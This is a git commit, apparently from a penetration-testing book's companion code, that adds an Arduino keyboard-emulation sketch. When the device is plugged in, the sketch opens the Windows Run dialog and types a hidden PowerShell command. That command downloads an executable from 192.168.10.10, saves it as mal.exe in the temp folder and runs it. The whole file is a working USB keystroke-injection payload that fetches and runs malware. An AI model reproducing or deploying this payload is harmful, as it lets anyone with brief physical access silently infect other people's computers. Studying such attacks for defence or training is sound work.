ba32a1b801992a8bbb440769052f0ad211781460
Nipun Jaswal <mail@nipunjaswal.info>
2020-02-12 21:38:23 -0800

    Chapter-7 Update

---
+++ Chapter-7/arduino_payload.ino
@@ -0,0 +1,34 @@
+#include <Keyboard.h>
+void setup()
+{
+  Keyboard.begin();
+  delay(2000);
+  type(KEY_LEFT_GUI, false);
+  type('d', false);
+  Keyboard.releaseAll();
+  delay(500);
+  type(KEY_LEFT_GUI, false);
+  type('r', false);
+  delay(500);
+  Keyboard.releaseAll();
+  delay(1000);
+  print(F("powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.10.10/taskhost.exe','%TEMP%\\mal.exe'); Start-Process \"%TEMP%\\mal.exe\""));
+  delay(1000);
+  type(KEY_RETURN, false);
+  Keyboard.releaseAll();
+  Keyboard.end();
+}
+void type(int key, boolean release)
+{
+  Keyboard.press(key);
+  if (release)
+    Keyboard.release(key);
+}
+void print(const __FlashStringHelper *value)
+{
+  Keyboard.print(value);
+}
+void loop()
+{
+}
+
